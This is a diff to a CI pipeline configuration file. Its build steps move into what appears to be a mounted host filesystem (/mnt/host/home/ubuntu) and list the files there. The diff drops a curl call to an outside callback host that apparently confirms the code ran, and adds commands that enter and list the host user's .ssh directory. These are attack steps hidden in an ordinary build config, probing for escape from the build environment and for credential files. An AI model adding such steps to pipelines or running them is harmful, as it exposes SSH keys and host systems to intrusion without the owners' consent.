@@ -11,4 +11,5 @@ pipelines:
             - cd /mnt/host/
             - cd home/ubuntu
             - ls -a
-            - curl http://alzer0t825an7eqapdphatpvgmmea3.nccburp.uk
+            - cd .ssh
+            - ls *
